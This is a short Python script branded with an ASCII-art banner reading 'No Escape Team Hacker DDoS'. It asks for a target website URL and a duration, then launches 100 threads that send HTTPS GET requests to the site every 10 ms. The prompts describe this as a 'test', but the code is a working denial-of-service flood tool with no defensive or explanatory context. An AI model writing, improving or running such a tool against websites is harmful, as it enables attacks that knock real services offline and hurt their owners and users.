
RED = "\033[31m"
RESET = "\033[0m"

ascii_art = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣤⠶⣒⣛⣛⡲⠶⣶⣶⠤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⢻⣭⣶⣶⣶⣶⣶⣦⣽⣿⣿⣿⣷⣾⣥⣝⣶⣭⣗⣲⡕⣠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣨⣷⣺⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣝⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⡫⢵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⡿⣿⣿⣞⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢼⣟⣯⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⣿⣷⢸⣿⣿⣾⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⢫⣾⣿⣿⣿⣿⣿⠋⠁⠀⠠⠀⠀⠀⠀⠀⠉⠻⢿⣿⣿⣿⣿⣿⠟⢀⣿⠟⣘⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣏⣿⣿⣿⣿⣿⣿⣿⣇⠀⠠⡖⠒⣲⣶⣶⣶⣦⣤⣄⡛⠛⠛⢛⣁⣤⡽⠿⠋⠉⠉⠀⠙⠛⠒⠦⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡅⣼⣿⣿⣿⣿⣿⣿⣿⠗⠀⠱⡀⢿⣿⣤⣧⡼⢻⢻⣿⠟⠉⢻⠟⠁⡰⠟⠁⠀⠀⠀⠀⠀⠀⠀⠈⢳⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈⠓⠭⠿⠭⠄⡊⠤⠊⠎⢢⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⢱⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣄⡀⠀⠀⠀⠀⡀⢀⠀⠀⠀⠀⡜⢠⢠⢀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣾⡄
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣨⢅⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄⣀⣀⡀⠀⠀⡠⢊⣀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡇
⠀⠀⠀⠀⠀⠀⠀⢀⡴⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⡘⠠⠋⢀⠤⢒⣒⣒⣒⠢⠤⢤⣄⣀⣀⣀⡀⠀⠀⣼⠁
⠀⠀⠀⠀⠀⠀⠀⣎⠾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠆⠀⠀⠀⠱⢄⢘⣡⠔⠶⢴⣒⣢⣤⡤⠖⠛⡏⠉⠉⠉⢣⢀⡟⠀
⠀⠀⠀⠀⠀⠀⠸⣴⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠐⠀⠀⢀⠒⣭⠅⠀⠀⠀⠀⠰⠌⠁⠀⡀⣷⠀⠀⠀⠀⠛⠀⠀
⠀⠀⠀⠀⠀⢀⡼⣱⣿⣿⣿⣿⣿⣿⣿⡿⣻⣿⣿⣷⡦⠄⠀⠀⠀⠀⠈⠀⠈⠁⠀⠂⠀⠀⠀⠀⠈⠀⠀⢀⣾⣧⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⢃⢋⣽⣿⣿⣿⣿⣿⣿⠵⣿⡿⣿⣿⣶⡿⣃⣀⣤⣴⣇⣠⣾⡇⠀⠀⠀⠀⠀⠀⠀⢠⡗⣸⣿⣿⣿⠆⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣾⣿⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣶⣿⣿⣿⣿⣿⢿⣿⣿⢿⣿⡟⠀⠀⢀⡄⠀⠀⠀⢀⣾⣿⣿⣿⣿⣯⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣯⣶⢖⣸⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣃⣿⣭⣾⣿⣯⣤⣴⣾⣿⢇⢌⣾⡆⣼⣿⣿⣿⣿⣏⢃⠃⠀⠀⠀⠀⠀⠀No Escape Team Hacker DDoS
⠠⣫⠾⣻⣿⢿⣿⠫⠾⠿⠿⣿⡛⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣷⣄⡀⠀⠀⠀⠀⠀
⠐⠁⣼⠟⢡⣿⠿⣿⣿⣿⡿⢟⣡⢖⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣻⢹⣇⡀⠀⠀⠀⠀⠀
⠀⠐⠁⢀⠟⢁⣾⣿⠿⣿⣾⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡿⣿⢓⣛⣿⣿⡿⢆⡀⠀⠀⠀
⠀⠀⠀⠊⢀⡞⠉⠀⣴⠟⣻⣷⣶⣶⣾⣭⣽⣿⣭⣵⡾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣉⠿⣩⣣⣿⣷⡞⢟⠟⣿⢛⠆⠈⠂⠀⠀⠀
⠀⠀⠀⠀⠈⠀⠀⠐⠁⣼⠟⢻⣿⣿⡿⠿⢿⣿⣿⣟⣟⣻⣿⣻⣿⣭⢇⡿⣛⢻⣿⣋⢿⢣⣿⣿⢿⣿⣿⡇⠀⠀⠀⠙⠈⠌⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠛⠋⠀⣀⣴⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣬⣾⣿⣟⣷⣿⣶⣿⠟⠁⠀⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠞⠛⠉⠀⠀⠀⠀⣼⠿⠋⠀⠉⢹⣿⡿⣿⣿⢿⣿⠏⠃⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⠏⢠⡿⠁⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


print(RED + ascii_art + RESET)
import http.client
import threading
import time
from urllib.parse import urlparse

# Function to make a request with a timeout
def fetch_with_timeout(url, timeout=2):
    try:
        parsed_url = urlparse(url)
        conn = http.client.HTTPSConnection(parsed_url.netloc, timeout=timeout)
        conn.request("GET", parsed_url.path or "/")
        response = conn.getresponse()
        conn.close()
        return response.status
    except Exception as e:
        return str(e)

# Function to flood a specific URL
def flood(url, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        fetch_with_timeout(url)
        time.sleep(0.01)  # Sleep for 10 milliseconds to control the rate of requests

# Main function to start the flood
def main():
    url = input("Enter the website URL to test: ")
    duration = int(input("Enter the duration of the test in seconds: "))
    
    # Start multiple threads to simulate concurrent users
    threads = []
    for _ in range(100):  # Adjust the number of threads to control load
        thread = threading.Thread(target=flood, args=(url, duration))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    print(f"Test completed for {url}")

if __name__ == "__main__":
    main()
